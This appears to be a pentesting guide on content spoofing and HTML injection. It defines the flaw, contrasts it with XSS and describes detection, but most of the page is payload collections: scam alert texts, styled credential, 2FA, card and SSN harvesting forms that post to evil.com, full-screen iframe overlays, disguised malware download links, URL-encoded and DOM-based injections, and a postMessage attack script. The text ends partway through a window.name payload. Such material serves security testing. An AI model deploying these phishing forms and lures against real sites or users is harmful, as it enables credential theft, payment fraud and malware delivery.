---
title: Content Spoofing
description: Complete pentesting guide to Content Spoofing — text injection, HTML injection, MIME type abuse, content type manipulation, email content spoofing, page impersonation, phishing via trusted domains, iframe injection, parameter-based spoofing, chained exploitation, and payload crafting for penetration testers and security researchers.
navigation:
  icon: i-lucide-file-diff
  title: Content Spoofing
---

## What is Content Spoofing?

Content Spoofing (also called Content Injection or Virtual Defacement) is a vulnerability that allows an attacker to **inject and control the content displayed** on a trusted web application's page. The attacker manipulates user-controlled input that is **reflected in the page** without proper sanitization, causing the application to render **fake, misleading, or malicious content** that appears to originate from the legitimate, trusted domain.

::callout{icon="i-lucide-info" color="blue"}
Content Spoofing is **not XSS**. While XSS injects executable JavaScript, Content Spoofing injects **non-script content** — text, HTML structure, images, forms, and styled elements — that trick users into believing fake information or entering credentials into attacker-controlled forms hosted under the trusted domain. Browsers and security tools often **do not flag** Content Spoofing because no script execution occurs.
::

### The Trust Exploitation Model

::tabs
  :::tabs-item{icon="i-lucide-eye" label="How Content Spoofing Works"}

  ```text
  LEGITIMATE PAGE                         SPOOFED PAGE
  ┌─────────────────────────┐            ┌─────────────────────────┐
  │ https://bank.com/search │            │ https://bank.com/search │
  │                         │            │ ?q=INJECTED_CONTENT     │
  │ Search Results:         │            │                         │
  │                         │            │ ⚠️ SECURITY ALERT       │
  │ No results found for    │            │                         │
  │ "normal query"          │            │ Your session has expired │
  │                         │            │ Please re-enter your    │
  │                         │            │ credentials:            │
  │                         │            │                         │
  │                         │            │ Username: [________]    │
  │                         │            │ Password: [________]    │
  │                         │            │ [Login]                 │
  │                         │            │                         │
  │ URL bar shows:          │            │ URL bar shows:          │
  │ ✅ bank.com (trusted)    │            │ ✅ bank.com (trusted)    │
  └─────────────────────────┘            └─────────────────────────┘
  
  The user sees bank.com in the address bar → TRUSTS the content
  The login form submits to attacker's server → CREDENTIALS STOLEN
  ```

  The victim sees the trusted domain `bank.com` in the URL bar. The browser shows the green lock. Security training says "check the URL" — and the URL looks legitimate. But the content is completely attacker-controlled.
  :::

  :::tabs-item{icon="i-lucide-code" label="Simple Example"}

  A search page reflects the query in the response:

  ```html
  <!-- Server renders: -->
  <p>You searched for: USER_INPUT</p>
  ```

  **Normal request:**
  ```text
  https://target.com/search?q=test
  → "You searched for: test"
  ```

  **Spoofed request:**
  ```text
  https://target.com/search?q=Your+account+has+been+compromised.+Call+1-800-SCAM+immediately.
  → "You searched for: Your account has been compromised. Call 1-800-SCAM immediately."
  ```

  The message appears on the legitimate domain. Users trust it.
  :::

  :::tabs-item{icon="i-lucide-code" label="Content Spoofing vs XSS"}

  | Aspect | Content Spoofing | Cross-Site Scripting (XSS) |
  |--------|-----------------|---------------------------|
  | **Injects** | Text, HTML structure, images, forms | JavaScript code |
  | **Executes code?** | **No** — no script execution | **Yes** — runs JavaScript |
  | **CSP blocks it?** | **No** — no script to block | Often yes |
  | **WAF detects it?** | **Rarely** — looks like normal text | Usually — detects `<script>` |
  | **Browser flags it?** | **Never** | Sometimes (XSS Auditor, legacy) |
  | **Impact** | Phishing, misinformation, social engineering | Session hijack, keylogging, full control |
  | **User interaction** | Must **believe** fake content | Automatic execution |
  | **Detection difficulty** | Very hard to detect automatically | Moderate with scanners |
  | **Severity rating** | Medium-High (context dependent) | High-Critical |

  :::
::

---

## Content Spoofing Categories

::card-group
  ::card
  ---
  title: Plain Text Injection
  icon: i-lucide-type
  ---
  Inject readable text that appears as part of the page's legitimate content. Fake error messages, security alerts, contact information, or instructions that trick users into dangerous actions.
  ::

  ::card
  ---
  title: HTML Injection (Non-Script)
  icon: i-lucide-code
  ---
  Inject HTML elements — headings, paragraphs, images, links, forms, tables, and styled content — without JavaScript. Create convincing fake page sections, login forms, and alerts.
  ::

  ::card
  ---
  title: Iframe Injection
  icon: i-lucide-layout
  ---
  Inject `<iframe>` elements that load attacker-controlled pages within the trusted domain's page. The iframe fills the visible area, completely replacing the legitimate content.
  ::

  ::card
  ---
  title: Image/Media Injection
  icon: i-lucide-image
  ---
  Inject fake images, logos, and media that impersonate the brand or display misleading information. Replace legitimate visual elements with attacker-controlled content.
  ::

  ::card
  ---
  title: Form Injection
  icon: i-lucide-text-cursor-input
  ---
  Inject HTML forms that mimic the application's login or data entry forms but submit to the **attacker's server**. The most dangerous content spoofing variant — directly steals credentials.
  ::

  ::card
  ---
  title: URL/Link Spoofing
  icon: i-lucide-link
  ---
  Inject or modify links that appear to point to legitimate resources but redirect to attacker-controlled destinations. Exploit the trusted domain to deliver malicious links.
  ::

  ::card
  ---
  title: Email Content Spoofing
  icon: i-lucide-mail
  ---
  Manipulate content reflected in emails sent by the application (notifications, alerts, password resets) to include attacker-controlled text, links, or instructions.
  ::

  ::card
  ---
  title: MIME Type Content Spoofing
  icon: i-lucide-file-type
  ---
  Manipulate `Content-Type` headers or file extensions to make the browser interpret content differently — rendering HTML where text was expected, or executing scripts disguised as images.
  ::
::

---

## Injection Points & Detection

::card-group
  ::card
  ---
  title: URL Parameter Reflection
  icon: i-lucide-link
  ---
  Any URL parameter whose value appears in the rendered page. Search queries, error messages, username displays, status messages, confirmation text, and filter descriptions.
  ::

  ::card
  ---
  title: Path Segment Reflection
  icon: i-lucide-folder
  ---
  URL path segments reflected in breadcrumbs, page titles, or navigation elements. `/products/INJECTED_CATEGORY/` → breadcrumb shows injected text.
  ::

  ::card
  ---
  title: Fragment / Hash Reflection
  icon: i-lucide-hash
  ---
  URL fragments (`#section`) processed by client-side JavaScript and rendered into the DOM. DOM-based content spoofing without server interaction.
  ::

  ::card
  ---
  title: HTTP Header Reflection
  icon: i-lucide-arrow-down-to-line
  ---
  Headers like `Referer`, `User-Agent`, `Host`, `Accept-Language` reflected in the page — analytics dashboards, error pages, admin panels, and log viewers.
  ::

  ::card
  ---
  title: Form Field Echo
  icon: i-lucide-text-cursor-input
  ---
  Form input values echoed back on confirmation pages, error pages, or profile displays. Contact forms, feedback forms, registration fields, and comment forms.
  ::

  ::card
  ---
  title: Error Message Reflection
  icon: i-lucide-alert-triangle
  ---
  Custom error pages that include the requested URL, parameter value, or user input in the error message. 404 pages, validation errors, and access denied messages.
  ::

  ::card
  ---
  title: API Response Rendering
  icon: i-lucide-webhook
  ---
  API responses rendered in the browser — debug endpoints, API explorers, webhook testing interfaces, and admin API consoles that display user-supplied data.
  ::

  ::card
  ---
  title: PDF / Document Generation
  icon: i-lucide-file-text
  ---
  User input rendered in generated PDFs, invoices, certificates, reports, or documents. Content appears in official-looking documents with the organization's branding.
  ::
::

### Detection Methodology

::steps{level="4"}

#### Submit Unique Marker Strings

Inject unique identifiable strings in every input field, URL parameter, header, and form field:

```text
CONTENTSPOOF_MARKER_12345
```

Search the response body for this exact string. Any reflection is a potential content spoofing point.

#### Test HTML Rendering

If the marker is reflected, test if HTML tags are rendered:

```text
<h1>SPOOFED_HEADING</h1>
```

If the page displays a rendered heading (not raw HTML text), HTML injection is possible.

#### Test Plain Text Context

If HTML tags are escaped or stripped, test plain text spoofing:

```text
URGENT: Your account has been compromised. Contact support at attacker-phone-number immediately.
```

Even without HTML rendering, convincing text on a trusted domain is dangerous.

#### Analyze Rendering Context

Determine where the input is reflected:

| Context | What's Possible |
|---------|----------------|
| Inside `<p>`, `<div>`, `<span>` | Text and HTML injection |
| Inside HTML attribute | Attribute breakout → HTML injection |
| Inside `<title>` | Tab title spoofing |
| Inside `<textarea>` | Textarea breakout → HTML injection |
| Inside JavaScript string | DOM-based content manipulation |
| Inside JSON response | API content spoofing |
| Inside error message | Error-based content injection |
| Inside PDF/document | Document-level spoofing |
| Inside email body | Email content spoofing |

::

---

## Payloads

::note
Content Spoofing payloads focus on **believability and social engineering** rather than code execution. The goal is to create content that looks legitimate, appears within the trusted domain, and tricks users into taking harmful actions. Every payload must be adapted to the target application's visual style and context.
::

### Plain Text Injection Payloads

::collapsible
---
label: "Security Alert / Warning Messages"
---

```text [Account Compromise Alert]
SECURITY ALERT: Unusual activity detected on your account. Your password has been reset for security purposes. Please contact our support team at +1-800-555-SCAM to verify your identity and regain access.
```

```text [Session Expiry Warning]
Your session has expired due to inactivity. Please log in again to continue. If you did not initiate this action, contact support immediately at support@evil-domain.com
```

```text [Payment Failure Notice]
PAYMENT FAILED: Your recent payment of $299.99 could not be processed. To avoid account suspension, please update your payment method at: https://evil.com/update-payment
```

```text [Account Suspension Notice]
NOTICE: Your account has been temporarily suspended due to suspicious activity. To reactivate your account, please verify your identity by calling our security team at 1-888-555-FAKE.
```

```text [Maintenance Notice]
SCHEDULED MAINTENANCE: This service will be temporarily unavailable on [date]. During this period, please use our backup portal at https://evil.com/backup-portal to access your account.
```

```text [Data Breach Notification]
IMPORTANT: We have detected a potential data breach affecting your account. As a precaution, please change your password immediately using the secure link: https://evil.com/change-password
```

```text [Refund Notification]
REFUND PENDING: A refund of $150.00 has been initiated for your account. To claim your refund, please verify your banking details at: https://evil.com/claim-refund
```

```text [Policy Update Notice]
POLICY UPDATE: Our Terms of Service have been updated. You must accept the new terms to continue using this service. Review and accept at: https://evil.com/new-terms
```

```text [Prize / Reward Scam]
CONGRATULATIONS! You have been selected for our loyalty reward program. You have earned 50,000 bonus points. Claim your reward before it expires: https://evil.com/claim-reward
```

```text [Technical Support Scam]
ERROR 0x80070005: A critical system error has been detected. Your data may be at risk. Please contact our technical support team immediately at +1-800-555-TECH for assistance.
```

```text [Job/HR Notice]
HR NOTICE: Your employment records require urgent verification. Please submit your updated personal information including SSN and banking details to hr-verification@evil.com within 48 hours.
```

```text [Tax/Government Scam]
IRS NOTICE: Irregularities have been found in your tax filing. To avoid penalties, please verify your information at: https://evil.com/irs-verification. Reference number: IRS-2024-FAKE
```
::

::collapsible
---
label: "Contact Information Replacement"
---

```text [Fake Support Number]
For immediate assistance, contact our 24/7 support hotline: +1-800-555-SCAM
```

```text [Fake Support Email]
If you need help, email our support team at: security-team@evil.com
```

```text [Fake Live Chat]
Need help? Start a live chat session with our support team: https://evil.com/live-chat
```

```text [Fake Office Address]
Visit our nearest office: 123 Fake Street, Suite 100, Scam City, SC 12345
```

```text [Fake Social Media]
Follow us on Twitter: @fake_support_account
Contact us on Facebook: facebook.com/fake-support-page
```

```text [Fake Wire Transfer Instructions]
PAYMENT INSTRUCTIONS UPDATED: Please send all future payments to:
Bank: Scam National Bank
Account: 123456789
Routing: 987654321
Reference: INV-2024-FAKE
```
::

::collapsible
---
label: "Instruction Manipulation"
---

```text [Download Malware]
A critical security update is available. Download and install it immediately to protect your account: https://evil.com/security-update.exe
```

```text [Disable Security Software]
NOTICE: Our security scan has detected a conflict with your antivirus software. Please temporarily disable your antivirus and firewall to complete the verification process.
```

```text [Share Credentials]
For security verification purposes, please reply with your current username and password. This is a one-time verification required by our updated security policy.
```

```text [Install Browser Extension]
To continue using this service, you must install our new security extension: https://evil.com/extension. This extension protects your browsing session.
```

```text [Remote Access]
Our security team needs to verify your system. Please install our remote support tool from: https://evil.com/remote-support and provide the access code to our agent at +1-800-555-SCAM.
```
::

### HTML Injection Payloads

::collapsible
---
label: "Fake Login Form Injection"
---

```html [Basic Credential Harvester]
<h2 style="color:red;font-family:Arial">⚠️ Session Expired</h2>
<p style="font-family:Arial">Your session has timed out. Please log in again to continue.</p>
<form action="https://evil.com/capture" method="POST" style="max-width:300px;margin:20px 0">
<input type="text" name="username" placeholder="Username" style="width:100%;padding:10px;margin:5px 0;border:1px solid #ccc;border-radius:4px"><br>
<input type="password" name="password" placeholder="Password" style="width:100%;padding:10px;margin:5px 0;border:1px solid #ccc;border-radius:4px"><br>
<input type="submit" value="Log In" style="width:100%;padding:10px;background:#007bff;color:white;border:none;border-radius:4px;cursor:pointer">
</form>
```

```html [Bank-Style Login Form]
<div style="background:#fff;border:1px solid #ddd;padding:30px;max-width:400px;margin:30px auto;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1)">
<h2 style="text-align:center;color:#333;margin-bottom:20px">Verify Your Identity</h2>
<p style="color:#666;font-size:14px;text-align:center">For your security, please re-enter your credentials</p>
<form action="https://evil.com/steal" method="POST">
<label style="display:block;margin:10px 0 5px;color:#333;font-weight:bold">Account Number</label>
<input type="text" name="account" style="width:100%;padding:12px;border:1px solid #ddd;border-radius:4px;box-sizing:border-box">
<label style="display:block;margin:10px 0 5px;color:#333;font-weight:bold">PIN</label>
<input type="password" name="pin" style="width:100%;padding:12px;border:1px solid #ddd;border-radius:4px;box-sizing:border-box">
<label style="display:block;margin:10px 0 5px;color:#333;font-weight:bold">Social Security Number</label>
<input type="text" name="ssn" placeholder="XXX-XX-XXXX" style="width:100%;padding:12px;border:1px solid #ddd;border-radius:4px;box-sizing:border-box">
<button type="submit" style="width:100%;padding:14px;background:#0066cc;color:white;border:none;border-radius:4px;margin-top:20px;font-size:16px;cursor:pointer">Verify Identity</button>
</form>
<p style="text-align:center;font-size:12px;color:#999;margin-top:15px">Protected by 256-bit SSL encryption</p>
</div>
```

```html [Two-Factor Code Harvester]
<div style="background:#f8f9fa;border:1px solid #dee2e6;padding:25px;max-width:350px;margin:20px auto;border-radius:8px">
<h3 style="text-align:center;color:#dc3545">🔒 Additional Verification Required</h3>
<p style="text-align:center;color:#666;font-size:14px">Enter the verification code sent to your phone</p>
<form action="https://evil.com/steal-2fa" method="POST">
<input type="text" name="otp_code" placeholder="6-digit code" maxlength="6" style="width:100%;padding:15px;text-align:center;font-size:24px;letter-spacing:8px;border:2px solid #007bff;border-radius:4px;box-sizing:border-box">
<button type="submit" style="width:100%;padding:12px;background:#28a745;color:white;border:none;border-radius:4px;margin-top:15px;font-size:16px;cursor:pointer">Verify</button>
</form>
<p style="text-align:center;font-size:12px;color:#999;margin-top:10px">Didn't receive a code? <a href="https://evil.com/resend">Resend</a></p>
</div>
```

```html [Credit Card Harvester]
<div style="background:#fff;border:1px solid #e0e0e0;padding:30px;max-width:420px;margin:20px auto;border-radius:10px;box-shadow:0 4px 15px rgba(0,0,0,0.08)">
<h3 style="text-align:center;color:#333">💳 Update Payment Method</h3>
<p style="color:#777;text-align:center;font-size:13px">Your payment method has expired. Please update to continue.</p>
<form action="https://evil.com/steal-cc" method="POST">
<label style="display:block;margin:8px 0 4px;color:#555;font-size:13px">Card Number</label>
<input type="text" name="card_number" placeholder="1234 5678 9012 3456" maxlength="19" style="width:100%;padding:10px;border:1px solid #ddd;border-radius:4px;box-sizing:border-box">
<div style="display:flex;gap:10px">
<div style="flex:1">
<label style="display:block;margin:8px 0 4px;color:#555;font-size:13px">Expiry</label>
<input type="text" name="expiry" placeholder="MM/YY" maxlength="5" style="width:100%;padding:10px;border:1px solid #ddd;border-radius:4px;box-sizing:border-box">
</div>
<div style="flex:1">
<label style="display:block;margin:8px 0 4px;color:#555;font-size:13px">CVV</label>
<input type="text" name="cvv" placeholder="123" maxlength="4" style="width:100%;padding:10px;border:1px solid #ddd;border-radius:4px;box-sizing:border-box">
</div>
</div>
<label style="display:block;margin:8px 0 4px;color:#555;font-size:13px">Cardholder Name</label>
<input type="text" name="cardholder" placeholder="John Smith" style="width:100%;padding:10px;border:1px solid #ddd;border-radius:4px;box-sizing:border-box">
<button type="submit" style="width:100%;padding:12px;background:#ff6600;color:white;border:none;border-radius:4px;margin-top:15px;font-size:15px;cursor:pointer">Update Payment</button>
<p style="text-align:center;font-size:11px;color:#aaa;margin-top:10px">🔒 Secured by PCI DSS compliance</p>
</form>
</div>
```

```html [Password Change Harvester]
<div style="background:#fff3cd;border:1px solid #ffc107;padding:20px;border-radius:8px;max-width:380px;margin:20px auto">
<h3 style="color:#856404">⚠️ Password Change Required</h3>
<p style="color:#856404;font-size:14px">Your password must be changed due to our updated security policy.</p>
<form action="https://evil.com/steal-password" method="POST">
<input type="password" name="current_password" placeholder="Current Password" style="width:100%;padding:10px;margin:5px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box">
<input type="password" name="new_password" placeholder="New Password" style="width:100%;padding:10px;margin:5px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box">
<input type="password" name="confirm_password" placeholder="Confirm New Password" style="width:100%;padding:10px;margin:5px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box">
<button type="submit" style="width:100%;padding:10px;background:#dc3545;color:white;border:none;border-radius:4px;margin-top:10px;cursor:pointer">Change Password</button>
</form>
</div>
```
::

::collapsible
---
label: "Fake Alert / Banner Injection"
---

```html [Critical Security Warning]
<div style="background:#dc3545;color:white;padding:20px;text-align:center;font-family:Arial;font-size:16px;position:relative;border-radius:4px">
<strong>🚨 CRITICAL SECURITY ALERT</strong><br>
<span style="font-size:14px">Unauthorized access attempt detected from IP 185.xx.xx.xx (Russia). Your account may be compromised. <a href="https://evil.com/verify" style="color:#ffd700;text-decoration:underline">Verify your identity immediately</a></span>
</div>
```

```html [System Maintenance Banner]
<div style="background:#17a2b8;color:white;padding:15px;text-align:center;font-family:Arial;border-radius:4px">
<strong>📢 System Maintenance Notice</strong><br>
<span style="font-size:13px">We are migrating to a new system. Please update your credentials at our new portal: <a href="https://evil.com/new-portal" style="color:#ffd700">https://secure-update.target.com</a></span>
</div>
```

```html [Account Verification Required]
<div style="background:#fff3cd;border-left:5px solid #ffc107;padding:15px;margin:15px 0;font-family:Arial">
<strong style="color:#856404">⚠️ Account Verification Required</strong>
<p style="color:#856404;margin:8px 0;font-size:14px">Due to recent security updates, all accounts must be re-verified within 24 hours or they will be suspended.</p>
<a href="https://evil.com/verify" style="display:inline-block;background:#ffc107;color:#333;padding:8px 20px;text-decoration:none;border-radius:4px;font-weight:bold">Verify Now</a>
</div>
```

```html [Fake Success Message — Credential Already Stolen]
<div style="background:#d4edda;border:1px solid #c3e6cb;padding:20px;border-radius:8px;max-width:400px;margin:20px auto;text-align:center">
<span style="font-size:48px">✅</span>
<h3 style="color:#155724">Verification Successful</h3>
<p style="color:#155724;font-size:14px">Your account has been verified. You will be redirected shortly.</p>
<p style="color:#999;font-size:12px">If you are not redirected, <a href="https://target.com">click here</a></p>
</div>
```

```html [Cookie Consent Hijack]
<div style="position:fixed;bottom:0;left:0;right:0;background:#333;color:white;padding:20px;font-family:Arial;z-index:99999;text-align:center">
<p style="margin:0 0 10px">This website requires you to verify your account to comply with updated regulations.</p>
<a href="https://evil.com/verify" style="background:#007bff;color:white;padding:10px 30px;text-decoration:none;border-radius:4px;margin:0 5px">Verify Account</a>
<a href="#" style="color:#aaa;text-decoration:underline;margin:0 5px">Learn More</a>
</div>
```

```html [Fake CAPTCHA]
<div style="background:#f2f2f2;border:1px solid #ccc;padding:20px;max-width:300px;margin:20px auto;border-radius:4px;text-align:center">
<img src="https://evil.com/fake-captcha.png" style="width:250px;height:80px;border:1px solid #ddd">
<form action="https://evil.com/steal-captcha" method="POST">
<input type="text" name="captcha" placeholder="Enter the code above" style="width:100%;padding:8px;margin:10px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box">
<input type="hidden" name="session_data" value="steal_session">
<button type="submit" style="width:100%;padding:8px;background:#4285f4;color:white;border:none;border-radius:4px;cursor:pointer">Verify</button>
</form>
<p style="font-size:10px;color:#999">reCAPTCHA verification required</p>
</div>
```
::

::collapsible
---
label: "Content Replacement / Page Override"
---

```html [Full Page Replacement — White Background Cover]
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:99999;display:flex;align-items:center;justify-content:center">
<div style="max-width:500px;text-align:center;font-family:Arial">
<h1 style="color:#333">Account Suspended</h1>
<p style="color:#666;font-size:16px;line-height:1.6">Your account has been temporarily suspended due to a violation of our Terms of Service. To appeal this decision, please provide the following information:</p>
<form action="https://evil.com/steal-identity" method="POST" style="text-align:left;margin-top:20px">
<label style="display:block;margin:10px 0 5px">Full Name</label>
<input type="text" name="fullname" style="width:100%;padding:10px;border:1px solid #ddd;border-radius:4px;box-sizing:border-box">
<label style="display:block;margin:10px 0 5px">Email Address</label>
<input type="email" name="email" style="width:100%;padding:10px;border:1px solid #ddd;border-radius:4px;box-sizing:border-box">
<label style="display:block;margin:10px 0 5px">Account Password</label>
<input type="password" name="password" style="width:100%;padding:10px;border:1px solid #ddd;border-radius:4px;box-sizing:border-box">
<label style="display:block;margin:10px 0 5px">Phone Number</label>
<input type="tel" name="phone" style="width:100%;padding:10px;border:1px solid #ddd;border-radius:4px;box-sizing:border-box">
<button type="submit" style="width:100%;padding:12px;background:#dc3545;color:white;border:none;border-radius:4px;margin-top:15px;cursor:pointer;font-size:16px">Submit Appeal</button>
</form>
</div>
</div>
```

```html [Fake Terms of Service Update]
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:99999;display:flex;align-items:center;justify-content:center">
<div style="background:white;max-width:600px;padding:40px;border-radius:12px;font-family:Arial">
<h2 style="color:#333;margin-bottom:15px">Updated Terms of Service</h2>
<div style="max-height:200px;overflow-y:scroll;border:1px solid #eee;padding:15px;font-size:12px;color:#666;line-height:1.6;margin-bottom:20px">
Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. By accepting these terms, you agree to provide identity verification including government-issued ID and proof of address. Ut enim ad minim veniam, quis nostrud exercitation...
</div>
<form action="https://evil.com/steal" method="POST">
<label style="display:flex;align-items:center;gap:10px;margin-bottom:15px;cursor:pointer">
<input type="checkbox" required>
<span style="font-size:14px">I agree to the updated Terms of Service</span>
</label>
<input type="hidden" name="accepted_terms" value="true">
<input type="password" name="password" placeholder="Enter your password to confirm" style="width:100%;padding:12px;border:1px solid #ddd;border-radius:4px;margin-bottom:15px;box-sizing:border-box">
<button type="submit" style="width:100%;padding:12px;background:#007bff;color:white;border:none;border-radius:4px;cursor:pointer;font-size:16px">Accept & Continue</button>
</form>
</div>
</div>
```
::

### Iframe Injection Payloads

::collapsible
---
label: "Full Page Iframe Overlay"
---

```html [Full-Screen Iframe — Covers Entire Page]
<iframe src="https://evil.com/phishing-page" style="position:fixed;top:0;left:0;width:100%;height:100%;border:none;z-index:99999"></iframe>
```

```html [Iframe with Invisible Border]
<iframe src="https://evil.com/clone-of-target" style="position:absolute;top:0;left:0;width:100vw;height:100vh;border:0;z-index:99999;background:white"></iframe>
```

```html [Iframe Replacing Content Area Only]
<iframe src="https://evil.com/fake-content" style="width:100%;height:600px;border:none;margin:-20px 0"></iframe>
```

```html [Multiple Small Iframes — Form Field Overlay]
<iframe src="https://evil.com/fake-username-field" style="position:absolute;top:200px;left:100px;width:300px;height:40px;border:none;z-index:99999"></iframe>
<iframe src="https://evil.com/fake-password-field" style="position:absolute;top:250px;left:100px;width:300px;height:40px;border:none;z-index:99999"></iframe>
```

```html [Transparent Iframe — Clickjacking Hybrid]
<iframe src="https://evil.com/transparent-action" style="position:absolute;top:0;left:0;width:100%;height:100%;opacity:0.01;z-index:99999"></iframe>
```

```html [Data URI Iframe (No External Request)]
<iframe src="data:text/html,<html><body><h1>Session Expired</h1><form action='https://evil.com/steal' method='POST'><input name='user' placeholder='Username'><input name='pass' type='password' placeholder='Password'><button>Login</button></form></body></html>" style="width:100%;height:400px;border:1px solid #ddd"></iframe>
```

```html [Srcdoc Iframe (Inline Content)]
<iframe srcdoc="<h2 style='color:red'>Account Locked</h2><p>Enter your credentials to unlock:</p><form action='https://evil.com/steal' method='POST'><input name='u' placeholder='Username'><br><input name='p' type='password' placeholder='Password'><br><button>Unlock</button></form>" style="width:100%;height:300px;border:none"></iframe>
```
::

### Image & Media Injection

::collapsible
---
label: "Visual Content Manipulation"
---

```html [Fake Logo Replacement]
<img src="https://evil.com/fake-official-logo.png" style="width:200px;display:block;margin:20px auto" alt="Official Logo">
```

```html [Fake QR Code — Leads to Phishing]
<div style="text-align:center;padding:20px">
<h3>Scan to verify your account</h3>
<img src="https://evil.com/malicious-qr-code.png" style="width:200px;height:200px" alt="QR Code">
<p style="font-size:12px;color:#999">Use your banking app to scan this code</p>
</div>
```

```html [Fake Screenshot of Account Activity]
<div style="border:1px solid #ddd;padding:15px;border-radius:8px;max-width:500px;margin:20px auto">
<h4>⚠️ Unauthorized Activity Detected</h4>
<img src="https://evil.com/fake-activity-screenshot.png" style="width:100%;border:1px solid #eee" alt="Account Activity">
<p style="color:#dc3545;font-size:14px">Unknown devices have accessed your account. <a href="https://evil.com/secure-account">Secure your account now</a></p>
</div>
```

```html [Fake Trust Seal / Certificate]
<div style="text-align:center;margin:20px">
<img src="https://evil.com/fake-ssl-seal.png" style="width:120px" alt="SSL Secured">
<img src="https://evil.com/fake-verified-badge.png" style="width:120px;margin-left:10px" alt="Verified">
<p style="font-size:11px;color:#999">This page is secured and verified</p>
</div>
```

```html [Fake Error Screenshot with Instructions]
<div style="background:#fff;border:2px solid #dc3545;padding:20px;margin:20px auto;max-width:500px;border-radius:8px">
<img src="https://evil.com/fake-error-dialog.png" style="width:100%;margin-bottom:15px" alt="System Error">
<p style="text-align:center;color:#333">To resolve this error, download the system repair tool:<br>
<a href="https://evil.com/malware.exe" style="display:inline-block;background:#007bff;color:white;padding:10px 20px;text-decoration:none;border-radius:4px;margin-top:10px">Download Repair Tool</a></p>
</div>
```

```html [Image-Based Text (Bypasses Text Filters)]
<img src="https://evil.com/text-as-image.png" style="width:100%;max-width:600px" alt="">
<!-- Text rendered as image to bypass text-based content filters -->
```

```html [Fake Profile/Avatar Manipulation]
<div style="display:flex;align-items:center;gap:10px;padding:10px;background:#f5f5f5;border-radius:8px">
<img src="https://evil.com/fake-admin-avatar.png" style="width:50px;height:50px;border-radius:50%">
<div>
<strong style="color:#333">System Administrator</strong>
<p style="color:#666;font-size:12px;margin:0">Official support account</p>
</div>
</div>
```
::

### Link Spoofing & URL Manipulation

::collapsible
---
label: "Malicious Link Injection"
---

```html [Disguised Download Link]
<a href="https://evil.com/malware.exe" style="color:#007bff;text-decoration:underline">Download Security Update (v3.2.1)</a>
```

```html [Link That Looks Like Official Domain]
<a href="https://evil.com/login" style="color:#007bff">https://target.com/secure-login</a>
<!-- Display text shows target.com but href goes to evil.com -->
```

```html [Fake "Continue" Button]
<a href="https://evil.com/phishing" style="display:inline-block;background:#28a745;color:white;padding:12px 30px;text-decoration:none;border-radius:4px;font-size:16px;font-weight:bold">Continue to Your Account →</a>
```

```html [Fake Navigation Links]
<nav style="background:#333;padding:10px;text-align:center">
<a href="https://evil.com/dashboard" style="color:white;margin:0 15px;text-decoration:none">Dashboard</a>
<a href="https://evil.com/settings" style="color:white;margin:0 15px;text-decoration:none">Settings</a>
<a href="https://evil.com/profile" style="color:white;margin:0 15px;text-decoration:none">Profile</a>
<a href="https://evil.com/support" style="color:white;margin:0 15px;text-decoration:none">Support</a>
</nav>
```

```html [Fake Password Reset Link]
<p style="font-family:Arial;color:#333">
A password reset was requested for your account. If you made this request, click the link below:<br><br>
<a href="https://evil.com/reset?token=fake" style="color:#007bff">Reset Your Password</a><br><br>
<span style="color:#999;font-size:12px">This link will expire in 24 hours. If you did not request this, please ignore this message.</span>
</p>
```

```html [Fake Redirect Notice]
<div style="background:#f8f9fa;padding:20px;border-radius:8px;text-align:center;max-width:400px;margin:20px auto">
<p style="font-size:16px;color:#333">You are being redirected to the secure verification page...</p>
<p style="font-size:14px;color:#666">If you are not redirected automatically, <a href="https://evil.com/verify">click here</a></p>
<div style="margin-top:15px">
<div style="width:200px;height:4px;background:#e9ecef;border-radius:2px;margin:0 auto;overflow:hidden">
<div style="width:60%;height:100%;background:#007bff;border-radius:2px"></div>
</div>
</div>
</div>
```
::

### URL Parameter Encoding Payloads

::collapsible
---
label: "URL-Encoded Content Spoofing"
---

```text [URL-Encoded Text Injection]
https://target.com/search?q=URGENT%3A%20Your%20account%20has%20been%20compromised.%20Call%201-800-555-SCAM%20immediately.
```

```text [URL-Encoded HTML Form]
https://target.com/search?q=%3Ch2%3ESession%20Expired%3C%2Fh2%3E%3Cform%20action%3D%22https%3A%2F%2Fevil.com%2Fsteal%22%20method%3D%22POST%22%3E%3Cinput%20name%3D%22user%22%20placeholder%3D%22Username%22%3E%3Cbr%3E%3Cinput%20name%3D%22pass%22%20type%3D%22password%22%20placeholder%3D%22Password%22%3E%3Cbr%3E%3Cbutton%3ELog%20In%3C%2Fbutton%3E%3C%2Fform%3E
```

```text [Double URL-Encoded]
https://target.com/search?q=%253Ch2%253EAlert%253C%252Fh2%253E
```

```text [Newline-Based Text Formatting (%0a)]
https://target.com/error?msg=Account%20locked%0a%0aTo%20unlock%20your%20account%2C%20contact%3A%0asupport%40evil.com%0a%0aReference%3A%20LOCK-2024-FAKE
```

```text [Tab-Separated Data Injection (%09)]
https://target.com/report?data=Username%09Password%09Email%0aadmin%09p%40ssw0rd%09admin%40target.com
```

```text [Unicode Text Direction Override]
https://target.com/search?q=%E2%80%AEverified%20account%E2%80%AC
```
::

### DOM-Based Content Spoofing

::collapsible
---
label: "Client-Side Content Manipulation"
---

```text [Hash Fragment Injection]
https://target.com/page#<h1>Your account has been hacked</h1><p>Contact support@evil.com</p>
```

```text [URL Fragment — Login Form]
https://target.com/page#<form action="https://evil.com/steal" method="POST"><input name="user" placeholder="Username"><input name="pass" type="password" placeholder="Password"><button>Login</button></form>
```

If the application's JavaScript processes `window.location.hash` and writes it to the DOM via `innerHTML`, `document.write`, or similar:

```javascript [Vulnerable JS Pattern]
// Application JavaScript
var content = window.location.hash.substring(1);
document.getElementById('output').innerHTML = decodeURIComponent(content);
```

```text [PostMessage-Based DOM Spoofing]
<!-- From attacker's page, send message to target iframe -->
<script>
var target = window.open('https://target.com/page');
setTimeout(function() {
    target.postMessage({
        type: 'notification',
        message: '<h2>Account Locked</h2><p>Contact support@evil.com</p>'
    }, '*');
}, 2000);
</script>
```

```text [window.name-Based Injection]
<!-- If target reads window.name and renders it -->
<script>
window.name = '<div style="background:red;color:white;padding:20px"><h2>Security Alert</h2><p>Your session is compromised</p></div>';
